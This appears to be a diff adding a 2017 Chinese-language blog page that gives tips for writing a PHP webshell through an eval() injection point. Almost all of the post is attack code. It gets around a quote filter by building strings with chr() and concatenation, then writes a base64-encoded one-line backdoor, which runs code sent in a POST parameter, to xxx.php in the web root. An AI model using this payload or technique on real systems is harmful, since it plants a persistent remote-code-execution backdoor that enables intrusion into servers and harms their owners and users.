@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="关于php写shell的tips"/>
+
+
+
+
+
+
+
+
+  <link rel="alternate" href="/default" title="muzzzzzzzz">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="http://yoursite.com/2017/11/29/关于php写shell的tips/"/>
+
+
+<meta name="description" content="#0x0011eval(&quot;\$sss = $aaa;&quot;); 由于莫名的过滤问题 不能写入单引号以及双引号以及捕捉不到$_REQUETS 没办法写入webshell #0x002最后利用php字符串拼接的特性绕过了单双引号的过滤12$jjjj = xxx.php;var_dump($jjjj); 这样">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于php写shell的tips">
+<meta property="og:url" content="http://yoursite.com/2017/11/29/关于php写shell的tips/index.html">
+<meta property="og:site_name" content="muzzzzzzzz">
+<meta property="og:description" content="#0x0011eval(&quot;\$sss = $aaa;&quot;); 由于莫名的过滤问题 不能写入单引号以及双引号以及捕捉不到$_REQUETS 没办法写入webshell #0x002最后利用php字符串拼接的特性绕过了单双引号的过滤12$jjjj = xxx.php;var_dump($jjjj); 这样php会输出一个警告 但不是致命错误 只要把特殊字符用chr转码再进行拼接就可以拼接出完整的字符串">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2017-11-29T05:33:34.054Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="关于php写shell的tips">
+<meta name="twitter:description" content="#0x0011eval(&quot;\$sss = $aaa;&quot;); 由于莫名的过滤问题 不能写入单引号以及双引号以及捕捉不到$_REQUETS 没办法写入webshell #0x002最后利用php字符串拼接的特性绕过了单双引号的过滤12$jjjj = xxx.php;var_dump($jjjj); 这样php会输出一个警告 但不是致命错误 只要把特殊字符用chr转码再进行拼接就可以拼接出完整的字符串">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+
+    <title> 关于php写shell的tips - muzzzzzzzz </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">muzzzzzzzz</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          关于php写shell的tips
+        
+      </h1>
+
+      <time class="post-time">
+          Nov 29 2017
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <h2 id="0x001"><a href="#0x001" class="headerlink" title="#0x001"></a><code>#0x001</code></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">"\$sss = $aaa;"</span>);</span><br></pre></td></tr></table></figure>
+<p>由于莫名的过滤问题 不能写入单引号以及双引号以及捕捉不到$_REQUETS 没办法写入webshell</p>
+<h2 id="0x002"><a href="#0x002" class="headerlink" title="#0x002"></a><code>#0x002</code></h2><h3 id="最后利用php字符串拼接的特性绕过了单双引号的过滤"><a href="#最后利用php字符串拼接的特性绕过了单双引号的过滤" class="headerlink" title="最后利用php字符串拼接的特性绕过了单双引号的过滤"></a>最后利用php字符串拼接的特性绕过了单双引号的过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$jjjj = xxx.php;</span><br><span class="line">var_dump($jjjj);</span><br></pre></td></tr></table></figure>
+<p>这样php会输出一个警告 但不是致命错误 只要把特殊字符用chr转码再进行拼接就可以拼接出完整的字符串</p>
+<h3 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$jjjj = xxx.chr(<span class="number">46</span>).php;</span><br><span class="line">$data = PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs.chr(<span class="number">47</span>).Pg.chr(<span class="number">61</span>).chr(<span class="number">61</span>);</span><br><span class="line">file_put_contents($jjjj,base64_decode($data));</span><br></pre></td></tr></table></figure>
+<p>写出 xxx.php 到根目录</p>
+
+            </div>
+          
+
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2012 -
+    
+    2017
+    <span class="footer-author">muzzz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/henryhuang/hexo-theme-polarbearsimple">Polar Bear Simple</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
